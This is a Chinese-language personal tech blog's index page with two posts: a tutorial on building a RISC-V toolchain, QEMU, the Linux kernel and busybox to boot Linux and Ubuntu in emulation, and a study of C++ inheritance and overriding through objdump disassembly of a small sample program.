<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":false,"nav":null,"activeClass":"valine"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="n0rthwater">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="n0rthwater">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="n0rthwater">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>n0rthwater</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>


<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">n0rthwater</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">尊严只在剑锋之上，真理只在大炮射程之内</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-commonweal">

    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/09/16/run-linux-on-riscv/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="n0rthwater">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="n0rthwater">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/09/16/run-linux-on-riscv/" class="post-title-link" itemprop="url">Run linux on riscv</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-09-16 09:59:47 / 修改时间：16:30:25" itemprop="dateCreated datePublished" datetime="2021-09-16T09:59:47+08:00">2021-09-16</time>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/2021/09/16/run-linux-on-riscv/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2021/09/16/run-linux-on-riscv/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="编译环境"><a href="#编译环境" class="headerlink" title="编译环境"></a>编译环境</h1><p>ubuntu 20.04</p>
<h1 id="编译riscv-gun-toolchain"><a href="#编译riscv-gun-toolchain" class="headerlink" title="编译riscv-gun-toolchain"></a>编译riscv-gun-toolchain</h1><p>Riscv的GNU交叉编译工具链</p>
<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>国内github下载太慢<br>我选择用码云下载</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone  https://gitee.com/mirrors/riscv-gnu-toolchain
<span class="token builtin class-name">cd</span> riscv-gnu-toolchain
<span class="token comment">#把之前的空文件夹删了</span>
<span class="token function">rm</span> -rf riscv-*
<span class="token comment">#再分别拉取分支</span>
<span class="token function">git</span> clone -b upstream git@gitee.com:mirrors/riscv-newlib.git
<span class="token function">git</span> clone -b riscv-glibc-2.29 git@gitee.com:mirrors/riscv-glibc.git
<span class="token function">git</span> clone -b riscv-gcc-9.2.0-rvv git@gitee.com:mirrors/riscv-gcc.git
<span class="token function">git</span> clone git@gitee.com:mirrors/riscv-dejagnu.git

<span class="token comment">#riscv-binutils与riscv-gdb为同一个仓库的不同分支</span>
<span class="token function">git</span> clone -b rvv-0.8.x git@gitee.com:mirrors/riscv-binutils-gdb.git riscv-binutils
<span class="token function">git</span> clone -b fsf-gdb-8.3-with-sim git@gitee.com:mirrors/riscv-binutils-gdb.git riscv-gdb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>交叉编译工具链主要有两个版本：</p>
<ul>
<li>riscv64-­unknown-­elf-gcc，使用newlib，主要用于编译静态程序或者单机嵌入式程序。</li>
<li>riscv64-unknown-­linux-­gnu-­gcc，使用glibc，可以编译动态链接程序，如大型操作系统如linux kernel等。</li>
</ul>
<h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>选择编译riscv-unknown-linux-gcc<br>编译前准备</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> autoconf automake autotools-dev <span class="token function">curl</span> python3 libmpc-dev libmpfr-dev libgmp-dev <span class="token function">gawk</span> build-essential bison flex texinfo gperf libtool patchutils <span class="token function">bc</span> zlib1g-dev libexpat-dev<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>编译</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">RISCV</span><span class="token operator">=</span>/opt/riscv
./configure --prefix<span class="token operator">=</span><span class="token variable">$RISCV</span>
<span class="token function">make</span> linux -j <span class="token variable">${nproc}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>修改环境变量  </p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token string">"<span class="token environment constant">$PATH</span>:<span class="token variable">$RISCV</span>/bin"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h1 id="编译qemu"><a href="#编译qemu" class="headerlink" title="编译qemu"></a>编译qemu</h1><p>下载</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/qemu/qemu<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>编译</p>
<pre class="line-numbers language-none"><code class="language-none">cd qemu
git checkout v5.0.0
./configure --target-list=riscv64-softmmu
make -j $(nproc)
sudo make install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h1 id="编译linux-kernel"><a href="#编译linux-kernel" class="headerlink" title="编译linux kernel"></a>编译linux kernel</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/torvalds/linux.git
<span class="token builtin class-name">cd</span> linux
<span class="token function">git</span> checkout v5.11
<span class="token function">make</span> <span class="token assign-left variable">ARCH</span><span class="token operator">=</span>riscv <span class="token assign-left variable">CROSS_COMPILE</span><span class="token operator">=</span>riscv64-unknown-linux-gnu- defconfig
<span class="token function">make</span> <span class="token assign-left variable">ARCH</span><span class="token operator">=</span>riscv <span class="token assign-left variable">CROSS_COMPILE</span><span class="token operator">=</span>riscv64-unknown-linux-gnu- -j <span class="token variable"><span class="token variable">$(</span>nproc<span class="token variable">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>编译完成后，最后生成的Kernel文件在linux/arch/riscv/boot/Image</p>
<h1 id="编译busybox"><a href="#编译busybox" class="headerlink" title="编译busybox"></a>编译busybox</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://git.busybox.net/busybox
<span class="token builtin class-name">cd</span> busybox
<span class="token comment"># 选择Build static binary</span>
<span class="token comment"># 编译选项中需要添加  --sysroot=$RISCV/sysroot</span>
<span class="token comment"># 否则会出现缺失头文件的错误</span>
<span class="token assign-left variable">CROSS_COMPILE</span><span class="token operator">=</span>riscv64-unknown-linux-gnu- <span class="token function">make</span> menuconfig
<span class="token assign-left variable">CROSS_COMPILE</span><span class="token operator">=</span>riscv64-unknown-linux-gnu- <span class="token function">make</span> -j <span class="token variable"><span class="token variable">$(</span>nproc<span class="token variable">)</span></span>
<span class="token assign-left variable">CROSS_COMPILE</span><span class="token operator">=</span>riscv64-unknown-linux-gnu- <span class="token function">make</span> <span class="token function">install</span>
<span class="token builtin class-name">cd</span> _install
<span class="token function">mkdir</span> -pv <span class="token punctuation">{</span>bin,sbin,etc,proc,sys,usr/<span class="token punctuation">{</span>bin,sbin<span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h1 id="制作根文件系统"><a href="#制作根文件系统" class="headerlink" title="制作根文件系统"></a>制作根文件系统</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> rootfs
qemu-img create rootfs.img
<span class="token function">sudo</span> <span class="token function">mount</span> -o loop rootfs.img rootfs
sudno <span class="token function">cp</span> -r busybox/_install ./rootfs/
<span class="token function">sudo</span> <span class="token function">umount</span> rootfs <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h1 id="启动基本linux程序"><a href="#启动基本linux程序" class="headerlink" title="启动基本linux程序"></a>启动基本linux程序</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">qemu-system-riscv64 -M virt -m 256M -nographic -kernel ./linux/arch/riscv/boot/Image -drive <span class="token assign-left variable">file</span><span class="token operator">=</span>rootfs.img,format<span class="token operator">=</span>raw,id<span class="token operator">=</span>hd0 -device virtio-blk-device,drive<span class="token operator">=</span>hd0 -append <span class="token string">"root=/dev/vda rw console=ttyS0"</span> -bios default<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h1 id="运行ubuntu"><a href="#运行ubuntu" class="headerlink" title="运行ubuntu"></a>运行ubuntu</h1><p>工具准备</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> qemu-system-misc opensbi u-boot-qemu qemu-utils<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>下载镜像</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://old-releases.ubuntu.com/releases/focal/ubuntu-20.04.2-preinstalled-server-riscv64.img.xz

xz -dk ubuntu-20.04.2-preinstalled-server-riscv64.img.xz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>启动qemu-ubuntu</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> qemu-system-riscv64 -machine virt -nographic -m <span class="token number">2048</span> -smp <span class="token number">4</span> -bios /usr/lib/riscv64-linux-gnu/opensbi/generic/fw_jump.elf -kernel /usr/lib/u-boot/qemu-riscv64_smode/uboot.elf -device virtio-net-device,netdev<span class="token operator">=</span>eth0 -netdev user,id<span class="token operator">=</span>eth0 -drive <span class="token assign-left variable">file</span><span class="token operator">=</span>ubuntu-20.04.2-preinstalled-server-riscv64.img,format<span class="token operator">=</span>raw,if<span class="token operator">=</span>virtio<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>用户名/密码：ubuntu/ubuntu</p>
<p>qemu命令选项解释：<br>-bios：设置bios程序<br>-kernel：设置操作系统内核<br>-drive file=<filename>：指定根文件系统<br>netdev=eth0：表示使用本机的eth0网卡    </filename></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1825739">https://cloud.tencent.com/developer/article/1825739</a></li>
<li><a target="_blank" rel="noopener" href="https://risc-v-getting-started-guide.readthedocs.io/en/latest/linux-qemu.html">https://risc-v-getting-started-guide.readthedocs.io/en/latest/linux-qemu.html</a></li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/09/07/c-cheng-xu-ni-xiang/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="n0rthwater">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="n0rthwater">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/09/07/c-cheng-xu-ni-xiang/" class="post-title-link" itemprop="url">C++程序逆向</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-09-07 15:18:38 / 修改时间：20:56:31" itemprop="dateCreated datePublished" datetime="2021-09-07T15:18:38+08:00">2021-09-07</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/" itemprop="url" rel="index"><span itemprop="name">逆向工程</span></a>
                </span>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/2021/09/07/c-cheng-xu-ni-xiang/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2021/09/07/c-cheng-xu-ni-xiang/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h1><p>示例代码：</p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;iostream&gt;

using namespace std;

class Human {
public:
		virtual void act()=0;
};

class Parent:public Human{
public:
		Parent(){
			name = 0;
		}

		void getName() {
			cout &lt;&lt; "Get parent's name.\n";
		}

		virtual void act() {
			cout &lt;&lt; "Parent act.\n";
		}
private:
		int name;
};

class Child:public Parent{
public:
		Child(){
			age = 10;
		}

		int getAge() {
			return age;
		}

		int getAge(int id) {
			return age+id;
		}

		void getName() {
			cout &lt;&lt; "Get children's name.\n";
		}

		virtual void act() {
			cout &lt;&lt; "Child act.\n";
		}
private:
		int age;
};

int main(){
		Child c;
		Parent p;
		cout &lt;&lt; "child's age is:" &lt;&lt; c.getAge(10) &lt;&lt; "\n";
		cout &lt;&lt; "child's age is:" &lt;&lt; c.getAge() &lt;&lt; "\n";
		c.getName();
		p.getName();
		c.act();
		p.act();
		return 0;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>编译：</p>
<pre class="line-numbers language-none"><code class="language-none">g++ -m64 test.cpp -o test <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>反汇编:</p>
<pre class="line-numbers language-none"><code class="language-none">objdump -d test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h2><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">0000000000001220 &lt;_ZN6ParentC1Ev&gt;:
    1220:	55                   	push   %rbp
    1221:	48 89 e5             	mov    %rsp,%rbp
    1224:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    1228:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    122c:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
    1232:	90                   	nop
    1233:	5d                   	pop    %rbp
    1234:	c3                   	retq   
    1235:	90                   	nop

0000000000001236 &lt;_ZN5ChildC1Ev&gt;:
    1236:	55                   	push   %rbp
    1237:	48 89 e5             	mov    %rsp,%rbp
    123a:	48 83 ec 10          	sub    $0x10,%rsp
    123e:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    1242:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1246:	48 89 c7             	mov    %rax,%rdi
    1249:	e8 d2 ff ff ff       	callq  1220 &lt;_ZN6ParentC1Ev&gt;
    124e:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1252:	c7 40 04 0a 00 00 00 	movl   $0xa,0x4(%rax)
    1259:	90                   	nop
    125a:	c9                   	leaveq 
    125b:	c3                   	retq   
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>父类构造函数：<br>this指针是函数的第1个参数，存放在rdi寄存器中。<br>val是类的第一个属性，因为这个类没有虚函数表，所以它在对象中的内存偏移为0。</p>
<p>子类构造函数：<br>存在传参的过程，即把子类构造函数接收到的参数传递给父类构造函数。<br>这里我们没有显式地调用父类构造函数，但是程序默认调用了父类构造函数。<br>最后程序会执行自己的代码逻辑。</p>
<h2 id="main函数："><a href="#main函数：" class="headerlink" title="main函数："></a>main函数：</h2><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">0000000000001165 &lt;main&gt;:
    1165:	55                   	push   %rbp
    1166:	48 89 e5             	mov    %rsp,%rbp
    1169:	53                   	push   %rbx
    116a:	48 83 ec 28          	sub    $0x28,%rsp
    116e:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
    1172:	48 89 c7             	mov    %rax,%rdi
    1175:	e8 8a 01 00 00       	callq  1304 &lt;_ZN5ChildC1Ev&gt;
    117a:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
    117e:	48 89 c7             	mov    %rax,%rdi
    1181:	e8 16 01 00 00       	callq  129c &lt;_ZN6ParentC1Ev&gt;
    1186:	48 8d 35 bb 0e 00 00 	lea    0xebb(%rip),%rsi        # 2048 &lt;_ZStL19piecewise_construct+0x44&gt;
    118d:	48 8d 3d ec 2e 00 00 	lea    0x2eec(%rip),%rdi        # 4080 &lt;_ZSt4cout@@GLIBCXX_3.4&gt;
    1194:	e8 a7 fe ff ff       	callq  1040 &lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt&gt;
    1199:	48 89 c3             	mov    %rax,%rbx
    119c:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
    11a0:	be 0a 00 00 00       	mov    $0xa,%esi
    11a5:	48 89 c7             	mov    %rax,%rdi
    11a8:	e8 9d 01 00 00       	callq  134a &lt;_ZN5Child6getAgeEi&gt;
    11ad:	89 c6                	mov    %eax,%esi
    11af:	48 89 df             	mov    %rbx,%rdi
    11b2:	e8 a9 fe ff ff       	callq  1060 &lt;_ZNSolsEi@plt&gt;
    11b7:	48 8d 35 9a 0e 00 00 	lea    0xe9a(%rip),%rsi        # 2058 &lt;_ZStL19piecewise_construct+0x54&gt;
    11be:	48 89 c7             	mov    %rax,%rdi
    11c1:	e8 7a fe ff ff       	callq  1040 &lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt&gt;
    11c6:	48 8d 35 7b 0e 00 00 	lea    0xe7b(%rip),%rsi        # 2048 &lt;_ZStL19piecewise_construct+0x44&gt;
    11cd:	48 8d 3d ac 2e 00 00 	lea    0x2eac(%rip),%rdi        # 4080 &lt;_ZSt4cout@@GLIBCXX_3.4&gt;
    11d4:	e8 67 fe ff ff       	callq  1040 &lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt&gt;
    11d9:	48 89 c3             	mov    %rax,%rbx
    11dc:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
    11e0:	48 89 c7             	mov    %rax,%rdi
    11e3:	e8 50 01 00 00       	callq  1338 &lt;_ZN5Child6getAgeEv&gt;
    11e8:	89 c6                	mov    %eax,%esi
    11ea:	48 89 df             	mov    %rbx,%rdi
    11ed:	e8 6e fe ff ff       	callq  1060 &lt;_ZNSolsEi@plt&gt;
    11f2:	48 8d 35 5f 0e 00 00 	lea    0xe5f(%rip),%rsi        # 2058 &lt;_ZStL19piecewise_construct+0x54&gt;
    11f9:	48 89 c7             	mov    %rax,%rdi
    11fc:	e8 3f fe ff ff       	callq  1040 &lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt&gt;
    1201:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
    1205:	48 89 c7             	mov    %rax,%rdi
    1208:	e8 57 01 00 00       	callq  1364 &lt;_ZN5Child7getNameEv&gt;
    120d:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
    1211:	48 89 c7             	mov    %rax,%rdi
    1214:	e8 a7 00 00 00       	callq  12c0 &lt;_ZN6Parent7getNameEv&gt;
    1219:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
    121d:	48 89 c7             	mov    %rax,%rdi
    1220:	e8 61 01 00 00       	callq  1386 &lt;_ZN5Child3actEv&gt;
    1225:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
    1229:	48 89 c7             	mov    %rax,%rdi
    122c:	e8 b1 00 00 00       	callq  12e2 &lt;_ZN6Parent3actEv&gt;
    1231:	b8 00 00 00 00       	mov    $0x0,%eax
    1236:	48 83 c4 28          	add    $0x28,%rsp
    123a:	5b                   	pop    %rbx
    123b:	5d                   	pop    %rbp
    123c:	c3                   	retq   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>116e两行表明，使用这种方式声明的对象的数据是布局在栈上的</p>
<h1 id="重载"><a href="#重载" class="headerlink" title="重载"></a>重载</h1><p>为类Child声明一个原型为int getAge(int)的函数，反汇编后程序中会多一个函数。</p>
<h1 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h1><p>静态多态与动态多态</p>
<p>静态多态即函数重载和函数模板</p>
<h2 id="覆盖："><a href="#覆盖：" class="headerlink" title="覆盖："></a>覆盖：</h2><p>父类中有1个非虚函数的函数，子类中也有1个同名函数，并且二者类型相同。<br>父类：</p>
<pre class="line-numbers language-none"><code class="language-none">000000000000129a &lt;_ZN6Parent7getNameEv&gt;:
    129a:	55                   	push   %rbp
    129b:	48 89 e5             	mov    %rsp,%rbp
    129e:	48 83 ec 10          	sub    $0x10,%rsp
    12a2:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    12a6:	48 8d 35 58 0d 00 00 	lea    0xd58(%rip),%rsi        # 2005 &lt;_ZStL19piecewise_construct+0x1&gt;
    12ad:	48 8d 3d cc 2d 00 00 	lea    0x2dcc(%rip),%rdi        # 4080 &lt;_ZSt4cout@@GLIBCXX_3.4&gt;
    12b4:	e8 87 fd ff ff       	callq  1040 &lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt&gt;
    12b9:	90                   	nop
    12ba:	c9                   	leaveq 
    12bb:	c3                   	retq <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>子类：</p>
<pre class="line-numbers language-none"><code class="language-none">000000000000130e &lt;_ZN5Child7getNameEv&gt;:
    130e:	55                   	push   %rbp
    130f:	48 89 e5             	mov    %rsp,%rbp
    1312:	48 83 ec 10          	sub    $0x10,%rsp
    1316:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    131a:	48 8d 35 f8 0c 00 00 	lea    0xcf8(%rip),%rsi        # 2019 &lt;_ZStL19piecewise_construct+0x15&gt;
    1321:	48 8d 3d 58 2d 00 00 	lea    0x2d58(%rip),%rdi        # 4080 &lt;_ZSt4cout@@GLIBCXX_3.4&gt;
    1328:	e8 13 fd ff ff       	callq  1040 &lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt&gt;
    132d:	90                   	nop
    132e:	c9                   	leaveq 
